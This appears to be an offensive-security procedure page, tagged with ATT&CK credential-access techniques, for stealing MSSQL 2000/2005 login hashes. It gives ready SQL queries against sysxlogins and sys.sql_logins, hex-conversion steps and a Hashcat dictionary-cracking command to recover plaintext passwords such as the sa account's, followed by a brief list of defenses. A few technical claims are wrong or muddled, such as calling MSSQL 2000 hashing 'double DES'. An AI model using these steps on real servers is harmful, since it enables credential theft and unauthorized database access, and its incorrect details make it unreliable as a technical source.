---
type: procedure
description: >-
  Extracts password hashes from MSSQL Server databases using SQL queries and
  cracks them offline using Hashcat to recover plaintext passwords.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/OS Credential Dumping|T1003 - OS Credential Dumping]]'
  - '[[techniques/Brute Force|T1110 - Brute Force]]'
sub_techniques: []
tags:
  - mssql
  - sql-server
  - password-cracking
  - hash-extraction
  - credential-access
commands:
  - '[[commands/mssql-retrieve-server-version]]'
  - '[[commands/mssql-2000-retrieve-name-password-sysxlogins]]'
  - '[[commands/mssql-2000-retrieve-name-hashed-password-sysxlogins]]'
  - '[[commands/mssql-2005-retrieve-name-password-hash-sql-logins]]'
  - '[[commands/mssql-2005-retrieve-name-hashed-password-sql-logins]]'
  - '[[commands/hashcat-crack-mssql-hashes]]'
platforms:
  - Windows
tools:
  - '[[tools/Hashcat]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# MSSQL-Server-Password-Hash-Extraction-and-Cracking

## Summary

This procedure extracts password hashes from Microsoft SQL Server (MSSQL) databases versions 2000 and 2005 using targeted SQL queries executed via a database client. The hashes are then saved to a file and cracked offline using Hashcat with a wordlist to recover plaintext passwords, enabling further access to the database or related systems.

## Description

In scenarios where an attacker has obtained SQL injection access, direct database credentials, or remote execution on a Windows host running MSSQL, this procedure allows dumping of sa or other administrative account hashes from system tables like sysxlogins (MSSQL 2000) or sys.sql_logins (MSSQL 2005). Hashes are converted to hexadecimal format for compatibility with cracking tools. Cracking targets weak passwords common in legacy systems, mapping to credential access tactics by dumping stored credentials and brute-forcing them. This is particularly effective against older MSSQL versions with weaker hashing (e.g., double DES in 2000). Prerequisites include authenticated access to the master database.

## Requirements

1. Authenticated access to the MSSQL instance (e.g., via sqlcmd, Query Analyzer, or SQL injection payload).
2. Knowledge of the MSSQL version or ability to query it.
3. Hashcat installed on the attacker's machine for offline cracking.
4. A wordlist file (e.g., rockyou.txt) containing potential passwords.
5. Basic SQL execution capabilities; no elevated privileges beyond SELECT on system tables.

## Defense

- Enforce strong, complex passwords for all MSSQL accounts and rotate them regularly.
- Disable or restrict access to system tables (sysxlogins, sys.sql_logins) using least privilege principles.
- Enable SQL Server auditing and logging for SELECT queries on master database; monitor for anomalous queries.
- Upgrade to modern MSSQL versions (2012+) with stronger hashing (SHA-512) and enforce password policies.
- Use network segmentation and firewalls to limit database exposure; implement multi-factor authentication where possible.

## Objectives

1. Identify the MSSQL version to select appropriate extraction queries.
2. Extract username and password hash pairs from system login tables.
3. Format and save hashes in a crackable file.
4. Crack hashes to recover plaintext passwords for further exploitation.
5. Verify successful cracking and test credentials if applicable.

## Instructions

### Step 1: Determine MSSQL Server Version

**Context**: Query the server version to determine whether to use sysxlogins (2000) or sys.sql_logins (2005) tables, as hash storage differs between versions.

**Command** ([[commands/mssql-retrieve-server-version]]):
```sql
SELECT @@VERSION
```

> This command returns the full version string, e.g., "Microsoft SQL Server 2000 - 8.00.2055 (Intel X86)". Use this to select the correct extraction path. If the version includes "2000", proceed to Step 2A; for "2005", go to Step 2B.

### Step 2A: Extract Hashes from MSSQL 2000 (sysxlogins Table)

**Context**: For legacy MSSQL 2000, query the sysxlogins table to retrieve usernames and hashes. The password field contains binary data; convert to hex for cracking.

**Command** ([[commands/mssql-2000-retrieve-name-password-sysxlogins]]):
```sql
SELECT name, password FROM master..sysxlogins
```

> Expected output: A table with columns 'name' (usernames like 'sa') and 'password' (binary varbinary data, e.g., 0x010100... ). This may show unhashed if weak, but typically binary.

**Command** ([[commands/mssql-2000-retrieve-name-hashed-password-sysxlogins]]):
```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```

> Expected output: Hex-formatted hashes prefixed by username, e.g., "sa:0x010100A29B6D5C0D7F5F5D5C0D7F5F5D...". Note: In some tools like Query Analyzer, hex conversion may require error message capture if direct output fails.

**Context**: Save the hex output to a file named mssql_hashes.txt in Hashcat format (username:hash per line).

### Step 2B: Extract Hashes from MSSQL 2005 (sys.sql_logins Table)

**Context**: For MSSQL 2005, query sys.sql_logins for SHA-1 hashed passwords. Convert the varbinary password_hash to hex.

**Command** ([[commands/mssql-2005-retrieve-name-password-hash-sql-logins]]):
```sql
SELECT name, password_hash FROM master.sys.sql_logins
```

> Expected output: Table with 'name' and 'password_hash' as binary, e.g., 0x020101... .

**Command** ([[commands/mssql-2005-retrieve-name-hashed-password-sql-logins]]):
```sql
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

> Expected output: Concatenated strings like "sa-0x020101A29B6D5C0D7F5F5D5C0D7F5F5D...". Save to mssql_hashes.txt.

### Step 3: Crack Extracted Hashes with Hashcat

**Context**: Use Hashcat in dictionary mode (-a 0) with the appropriate mode for MSSQL hashes (131 for 2000, 132 for 2005, 1731 for 2012+). Reference [[codes/mssql-hashcat-modes-reference]] for mode selection based on version.

**Command** ([[commands/hashcat-crack-mssql-hashes]]):
```bash
hashcat -m $_MODE -a 0 $_HASH_FILE $_WORDLIST
```

> Replace $_MODE with 131/132/1731, $_HASH_FILE with mssql_hashes.txt, $_WORDLIST with /usr/share/wordlists/rockyou.txt. Expected output: Cracking progress; successful cracks shown as "sa:password123". If no match, try rules or masks. Remove --force unless needed for unrecognized formats.
